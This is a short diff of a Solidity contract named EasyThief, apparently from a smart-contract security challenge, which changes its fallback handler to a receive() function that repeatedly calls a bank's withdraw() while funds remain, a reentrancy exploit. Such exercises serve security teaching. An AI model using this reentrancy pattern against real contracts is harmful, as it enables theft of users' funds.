@@ -17,7 +17,7 @@ contract EasyThief {
     //
     // CHALLENGE: IMPLEMENT PART OF THE EXPLOIT HERE
     //
-    fallback() external payable {
+    receive() external payable {
         if (address(bank).balance >= msg.value) {
             bank.withdraw();
         }
